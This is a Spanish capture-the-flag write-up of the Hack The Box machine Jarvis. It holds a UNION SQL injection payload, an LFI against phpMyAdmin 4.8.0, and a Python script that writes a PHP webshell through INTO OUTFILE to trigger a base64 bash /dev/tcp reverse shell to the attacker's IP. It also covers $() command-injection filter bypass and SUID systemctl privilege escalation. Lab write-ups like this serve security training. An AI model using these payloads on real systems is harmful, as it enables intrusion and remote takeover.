---
title : Máquina|Jarvis|HTB|SQL|SUID
published : True
---

<div class="contenedor imgc">
    <img class="imgc" src="imgs/Jarvis/Jarvis0.png" style="border-radius: 190px; width: 169px" alt="Jarvis">
    <div>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: Media </p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://app.hackthebox.com/machines/194" style="color: lightblue;">Jarvis</a></p>
    </div>
</div>

<h2><font color="white"><center># Jarvis</center></font></h2>
<br>


* <p>Vemos que es una maquina Linux a lo que nos enfrentamos por el TTL.</p>
>
<img src="imgs/Jarvis/Jarvis1.png">

* <p> Empezamos enumerando los puertos del servidor.</p>
>
<img src="imgs/Jarvis/Jarvis2.png">

* <p> Ahora procedemos a enumerar las tecnologías.</p>
>
<img src="imgs/Jarvis/Jarvis3.png">

* <p> Enumeramos directorios y archivos activos de la pagina web.</p>
>
<img src="imgs/Jarvis/Jarvis4.png">
>

* <p> Observamos el phpmyadmin y probamos credenciales por defecto.</p>
>
<img src="imgs/Jarvis/Jarvis5.png">

* <p> Al estar enumerando la pagina mire que era susceptible a un ataque de inyección sql.</p>
>
<img src="imgs/Jarvis/Jarvis6.png">
>
`union select 1,2,group_concat(User,0x3a,Password),4,5,6,7 from mysql.user-- -`

* <p> Procedemos a descifrar el hash que es MySQL 4.1, y sacamos como resultado la credencial: imissyou</p>
<img src="imgs/Jarvis/Jarvis7.png">


* <p> Procedemos a conectarnos en el panel previamente descubierto anteriormente.</p>
>
<img src="imgs/Jarvis/Jarvis8.png">

* <p> Procedemos a ver en searchsploit si hay exploits dedicados a esta version de phpmyadmin 4.8.0, vemos que puede ser susceptible a LFI.</p>
>
<img src="imgs/Jarvis/Jarvis9.png">
* <p> Vemos la posterior ruta en la que este exploit acude para poder tener un LFI y observamos la siguiente url</p>
>
<img src="imgs/Jarvis/Jarvis10.png">

* <p> Alistamos el /etc/passwd y vemos que si es vulnerable a un LFI</p>
>
<img src="imgs/Jarvis/Jarvis11.png">

* <p>No vemos nada relevante asi que procedemos a cargar un archivo por medio de la inyección SQL en la pagina web </p>
>
<img src="imgs/Jarvis/Jarvis12.png">

* <p>Vemos que nos interpreta el código.</p>
>
<img src="imgs/Jarvis/Jarvis13.png">

* <p>Posteriormente nos creamos un "exploit" para que nos automatice todo, lo que hace es codificar en base64 una reverse Shell, lanza la petición para que se aloje en el directorio 10.10.10.143/rem.php para posteriormente lanza otra petición a ese directorio del sistema mientras nos ponemos en escucha por el puerto 5550.</p>

```python
#!/usr/bin/python3
import requests
import sys
import signal
import time
import threading
from pwn import *

def salida(sig, frame):
	print("saliendo")
	sys.exit(1)

signal.signal(signal.SIGINT, salida)

#Cree su propia Shell base64 : echo "/bin/bash -i >& /dev/tcp/IP/5550 0>&1" | base64 
base64 = "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNTU1MCAwPiYxCg=="
port = 5550
url_ = "http://10.10.10.143"
file = "rem.php"

create_file = "http://10.10.10.143/room.php?cod=10%20union%20select%201,2,%22%3C?php%20system(%27echo%20{base64}%20|base64%20-d%20|bash%20%27);?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/{file}%22--%20-"
def pwned_shell():
    get_file = requests.get(create_file)
    get_shell = requests.get(f"{url_}/{file}")

try:
    threading.Thread(target=pwned_shell, args=()).start()
except Exception as e:
    log.error(str(e))

server = listen(port, timeout=20).wait_for_connection()
server.interactive()

```

* exploit.py
>
<img src="imgs/Jarvis/Jarvis15.png">

* <p> Procedemos a ejecutar el exploit. </p>


<video autoplay loop muted style="width: 100%; max-width: 600px; border-radius: 12px; margin: 0 auto; display: block;">
  <source src="imgs/Jarvis/video.mp4" type="video/mp4">
  Tu navegador no soporta la reproducción de video.
</video>


* <p> Como quiero crearme una full tty no usare este exploit, sino que me pondré en escucha no netcat por el puerto 5550 y ejecuto el script.</p>
>
<img src="imgs/Jarvis/Jarvis16.png">

* <p> Procedemos cone el tratemiento de la Shell para tener una full tty.</p>
>
<img src="imgs/Jarvis/Jarvis18.png">
<img src="imgs/Jarvis/Jarvis19.png">
<img src="imgs/Jarvis/Jarvis21.png">

* <p>En este punto podríamos ver la flag de jarvis.</p>
>
<img src="imgs/Jarvis/Jarvis35.png">

* <p>Vemos que tenemos permiso para ejecutar un archivo en python siendo el usuario pepper.</p>
>
<img src="imgs/Jarvis/Jarvis36.png">

* <p>EL archivo python no esta del todo bien sanitizado. no me permite ejecutar ['&', ';', '-', '`', '||', '|'] pero no necesariamente tengo que usar estos caracteres para inyectar comandos y escalar privilegios, que paso si ahora ejecuto </p>
>
<img src="imgs/Jarvis/Jarvis22.png">

* <p>Vemos que al inyectar en el campo un $(echo "2"),recibimos la traza ICMP a mi interfaz 10.10.16.2 tun0.</p>
>
<img src="imgs/Jarvis/Jarvis23.png">

* <p>Si me hago una reverse Shell no podría ganar acceso al sistema por que no me permite el &, entonces para hacerle un Bypass a esta solicitud me creo un archivo temporal, en este almacenare la reverse Shell:</p>
>
<img src="imgs/Jarvis/Jarvis25.png">

* <p>Posterior mente me ejecuto el archivo. y ganamos acceso al sistema siendo pepper.</p>
>
<img src="imgs/Jarvis/Jarvis26.png">

* <p>Hacemos la Shell una full tty</p>
>
<img src="imgs/Jarvis/Jarvis27.png">

* <p>Ajustamos las filas y columnas.</p>
>
<img src="imgs/Jarvis/Jarvis30.png">

* <p>Vemos que tiene permisos SUID a systemctl lo que hace vulnerable, podemos crearnos una tarea siendo root.</p>
>
<img src="imgs/Jarvis/Jarvis31.png">

* <p>Estructura básica de una tarea systemctl</p>

```ruby
[Unit]
Description=Descripción del servicio
After=network.target

[Service]
Type=oneshot
ExecStart=/ruta/a/tu/programa

[Install]
WantedBy=multi-user.target
```

* <p>Configuramos los archivos y ganamos posteriormente acceso al sistema</p>
>
<img src="imgs/Jarvis/Jarvis33.png">

* <p>Posteriormente podemos ver la flag de root.</p>
>
<img src="imgs/Jarvis/Jarvis34.png">